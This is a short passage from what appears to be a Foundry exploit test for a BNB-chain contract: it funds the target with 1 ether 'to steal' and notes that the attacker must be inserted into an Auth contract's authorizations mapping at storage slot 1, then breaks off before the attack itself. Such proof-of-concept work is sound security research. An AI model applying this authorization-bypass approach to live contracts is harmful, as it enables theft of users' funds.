    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = address(this).balance;

        // Send 1 BNB to the contract to ensure there's something to steal
        deal(TARGET, 1 ether);

        // We need to add attacker to authorizations mapping
        // In Auth contract: authorizations mapping is at slot 1
